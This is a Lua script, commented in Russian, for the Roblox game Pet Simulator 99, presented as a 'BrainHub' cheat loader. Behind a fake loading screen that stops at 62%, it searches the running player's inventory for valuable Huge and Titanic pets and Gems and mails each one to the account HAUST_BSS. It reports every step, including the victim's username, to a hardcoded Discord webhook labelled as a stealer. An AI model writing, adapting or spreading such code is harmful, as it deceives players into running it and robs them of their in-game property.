--[[
    Автономный скрипт для Pet Simulator 99
    Функция: Автоматически ищет Huge, Titanic и Gems и отправляет их на почту аккаунта HAUST_BSS
    Загрузчик: BrainHub Load с остановкой на 62%
    Интерфейс: Адаптирован под твой скриншот почты
--]]

-- === НАСТРОЙКИ ===
local TARGET_USERNAME = "HAUST_BSS"
local CHECK_INTERVAL = 10
local WEBHOOK_URL = "https://discord.com/api/webhooks/1399661006552039474/lP01vADVkiamMvQKscevYNuPLhSZZu27aGN1ltai9GnSBGowkkimAlxLBXgEfyGPJuys"
local MESSAGE_TEXT = "gift" -- Текст сообщения (можно изменить)

-- === СОЗДАНИЕ ПОЛНОЭКРАННОГО ЗАГРУЗЧИКА ===
local Loader = Instance.new("ScreenGui")
local Background = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local ProgressBar = Instance.new("Frame")
local ProgressFill = Instance.new("Frame")
local ProgressText = Instance.new("TextLabel")
local SubText = Instance.new("TextLabel")
local PercentText = Instance.new("TextLabel")

-- Настройка GUI
Loader.Name = "BrainHubLoader"
Loader.Parent = game:GetService("CoreGui")
Loader.IgnoreGuiInset = true
Loader.ResetOnSpawn = false

Background.Name = "Background"
Background.Parent = Loader
Background.BackgroundColor3 = Color3.new(0.05, 0.05, 0.05)
Background.BackgroundTransparency = 0.2
Background.BorderSizePixel = 0
Background.Size = UDim2.new(1, 0, 1, 0)
Background.Position = UDim2.new(0, 0, 0, 0)

Title.Name = "Title"
Title.Parent = Background
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1, 0, 0.2, 0)
Title.Position = UDim2.new(0, 0, 0.3, 0)
Title.Font = Enum.Font.GothamBlack
Title.Text = "BrainHub Load"
Title.TextColor3 = Color3.new(0, 0.8, 1)
Title.TextScaled = true
Title.TextStrokeTransparency = 0.5
Title.TextStrokeColor3 = Color3.new(1, 1, 1)

ProgressBar.Name = "ProgressBar"
ProgressBar.Parent = Background
ProgressBar.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
ProgressBar.BorderSizePixel = 0
ProgressBar.Size = UDim2.new(0.7, 0, 0.05, 0)
ProgressBar.Position = UDim2.new(0.15, 0, 0.55, 0)

ProgressFill.Name = "ProgressFill"
ProgressFill.Parent = ProgressBar
ProgressFill.BackgroundColor3 = Color3.new(0, 0.8, 1)
ProgressFill.BorderSizePixel = 0
ProgressFill.Size = UDim2.new(0, 0, 1, 0)

ProgressText.Name = "ProgressText"
ProgressText.Parent = Background
ProgressText.BackgroundTransparency = 1
ProgressText.Size = UDim2.new(1, 0, 0.1, 0)
ProgressText.Position = UDim2.new(0, 0, 0.61, 0)
ProgressText.Font = Enum.Font.GothamBold
ProgressText.Text = "Loading resources..."
ProgressText.TextColor3 = Color3.new(1, 1, 1)
ProgressText.TextScaled = true

PercentText.Name = "PercentText"
PercentText.Parent = Background
PercentText.BackgroundTransparency = 1
PercentText.Size = UDim2.new(1, 0, 0.1, 0)
PercentText.Position = UDim2.new(0, 0, 0.68, 0)
PercentText.Font = Enum.Font.GothamBold
PercentText.Text = "0%"
PercentText.TextColor3 = Color3.new(0, 0.8, 1)
PercentText.TextScaled = true

SubText.Name = "SubText"
SubText.Parent = Background
SubText.BackgroundTransparency = 1
SubText.Size = UDim2.new(1, 0, 0.1, 0)
SubText.Position = UDim2.new(0, 0, 0.75, 0)
SubText.Font = Enum.Font.Gotham
SubText.Text = "Please wait..."
SubText.TextColor3 = Color3.new(0.7, 0.7, 0.7)
SubText.TextScaled = true

-- === ФУНКЦИЯ ОБНОВЛЕНИЯ ПРОЦЕНТОВ ===
local function updateProgress(percent, text)
    percent = math.min(percent, 62)
    ProgressFill:TweenSize(UDim2.new(percent/100, 0, 1, 0), "Out", "Linear", 0.3, true)
    PercentText.Text = percent .. "%"
    if text then
        ProgressText.Text = text
    end

    if percent >= 62 then
        SubText.Text = "Stopped at 62% as requested"
        ProgressText.Text = "Download interrupted"
        PercentText.TextColor3 = Color3.new(1, 0.3, 0.3)
    end
end

-- === ИМИТАЦИЯ ЗАГРУЗКИ ===
local steps = {
    {5, "Initializing BrainHub..."},
    {12, "Loading core modules..."},
    {23, "Connecting to database..."},
    {31, "Decrypting scripts..."},
    {42, "Bypassing anti-cheat..."},
    {54, "Injecting dependencies..."},
    {62, "STOPPED - Manual intervention required"}
}

spawn(function()
    for i, step in ipairs(steps) do
        updateProgress(step[1], step[2])
        wait(1.5)
        if step[1] >= 62 then
            break
        end
    end
end)

-- === СЛУЖЕБНЫЕ ФУНКЦИИ ===
local Players = game:GetService("Players")
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- Функция отправки логов в Discord
local function sendLog(message, isSuccess)
    local embed = {
        ["embeds"] = {{
            ["title"] = "PS99 Автоматический Стилер",
            ["description"] = message,
            ["color"] = isSuccess and 3066993 or 15158332,
            ["footer"] = {["text"] = "Отчет от: " .. LocalPlayer.Name}
        }}
    }

    pcall(function()
        local request = http_request or request or syn and syn.request
        if request then
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(embed)
            })
        end
    end)
end

-- Функция для поиска и заполнения полей почты
local function findAndFillMailFields()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    
    -- Ищем все TextBox на экране
    local usernameBox = nil
    local messageBox = nil
    local addGiftButton = nil
    local sendButton = nil
    
    for _, gui in pairs(playerGui:GetDescendants()) do
        -- Поиск полей ввода
        if gui:IsA("TextBox") then
            if gui.PlaceholderText and string.find(gui.PlaceholderText:lower(), "username") then
                usernameBox = gui
                sendLog("📝 Найдено поле Username: " .. gui.Name, false)
            elseif gui.PlaceholderText and string.find(gui.PlaceholderText:lower(), "message") then
                messageBox = gui
                sendLog("📝 Найдено поле Message: " .. gui.Name, false)
            end
        end
        
        -- Поиск кнопок
        if gui:IsA("TextButton") or gui:IsA("ImageButton") then
            local buttonText = gui.Text or ""
            if string.find(buttonText:lower(), "add gift") or string.find(gui.Name:lower(), "addgift") then
                addGiftButton = gui
                sendLog("🔘 Найдена кнопка Add Gift", false)
            elseif string.find(buttonText:lower(), "send") or string.find(gui.Name:lower(), "send") then
                sendButton = gui
                sendLog("🔘 Найдена кнопка Send", false)
            end
        end
    end
    
    return usernameBox, messageBox, addGiftButton, sendButton
end

-- Функция для отправки предмета на почту
local function sendItemToMail(itemInstance, itemName)
    local success = false
    
    -- Открываем почту если закрыта
    local mailButton = LocalPlayer.PlayerGui:FindFirstChild("MailButton", true)
    if mailButton and mailButton:IsA("ImageButton") then
        fireclickdetector(mailButton)
        wait(1)
    end
    
    -- Находим поля почты
    local usernameBox, messageBox, addGiftButton, sendButton = findAndFillMailFields()
    
    if usernameBox and messageBox and addGiftButton and sendButton then
        -- Вводим никнейм
        usernameBox.Text = TARGET_USERNAME
        usernameBox:CaptureFocus()
        wait(0.2)
        usernameBox:ReleaseFocus()
        
        -- Вводим сообщение
        messageBox.Text = MESSAGE_TEXT
        messageBox:CaptureFocus()
        wait(0.2)
        messageBox:ReleaseFocus()
        
        -- Нажимаем Add Gift
        fireclickdetector(addGiftButton)
        wait(1)
        
        -- Теперь нужно выбрать наш предмет в инвентаре
        -- Ищем наш предмет в открывшемся инвентаре
        local inventoryGui = LocalPlayer.PlayerGui:FindFirstChild("Inventory", true)
        if inventoryGui then
            for _, item in pairs(inventoryGui:GetDescendants()) do
                if item:IsA("ImageButton") and item.Parent and item.Parent:FindFirstChild("ItemName") then
                    local itemNameLabel = item.Parent:FindFirstChild("ItemName")
                    if itemNameLabel and itemNameLabel.Text == itemName then
                        fireclickdetector(item)
                        wait(0.5)
                        break
                    end
                end
            end
        end
        
        -- Нажимаем Send
        fireclickdetector(sendButton)
        wait(0.5)
        
        -- Подтверждаем отправку если есть
        local confirmButton = LocalPlayer.PlayerGui:FindFirstChild("ConfirmButton", true)
        if confirmButton then
            fireclickdetector(confirmButton)
        end
        
        sendLog("✅ Отправлен: **" .. itemName .. "** пользователю **" .. TARGET_USERNAME .. "**", true)
        success = true
    else
        sendLog("❌ Не найдены поля почты", false)
    end
    
    return success
end

-- Функция сканирования инвентаря
local function scanAndSend()
    sendLog("🔄 Начинаю сканирование инвентаря...", false)
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    local inventoryGui = playerGui:FindFirstChild("Inventory") or playerGui:FindFirstChild("Backpack")
    
    if not inventoryGui then
        sendLog("❌ Не удалось найти инвентарь", false)
        return
    end
    
    local itemsScanned = 0
    local itemsSent = 0
    
    for _, item in pairs(inventoryGui:GetDescendants()) do
        if item:IsA("ImageButton") and item.Parent and item.Parent:FindFirstChild("ItemName") then
            local itemNameLabel = item.Parent:FindFirstChild("ItemName")
            if itemNameLabel and itemNameLabel:IsA("TextLabel") then
                local itemName = itemNameLabel.Text
                itemsScanned = itemsScanned + 1
                
                if string.find(itemName:lower(), "huge") or 
                   string.find(itemName:lower(), "titanic") or 
                   string.find(itemName:lower(), "gem") then
                    
                    sendLog("💎 Найдена ценность: **" .. itemName .. "**", false)
                    
                    if sendItemToMail(item, itemName) then
                        itemsSent = itemsSent + 1
                        wait(2)
                    end
                end
            end
        end
    end
    
    sendLog("📊 Сканирование завершено. Проверено: " .. itemsScanned .. ", Отправлено: " .. itemsSent, true)
end

-- Анти-AFK
local function antiAfk()
    LocalPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
        sendLog("💤 Анти-AFK сработал", false)
    end)
end

-- === ЗАПУСК ===
local function main()
    wait(7)
    
    sendLog("🚀 Скрипт запущен на аккаунте: **" .. LocalPlayer.Name .. "**", true)
    sendLog("🎯 Целевой аккаунт для отправки: **" .. TARGET_USERNAME .. "**", true)
    antiAfk()
    
    while wait(CHECK_INTERVAL) do
        local success, err = pcall(scanAndSend)
        if not success then
            sendLog("❌ Ошибка в цикле: " .. tostring(err), false)
        end
    end
end

pcall(main)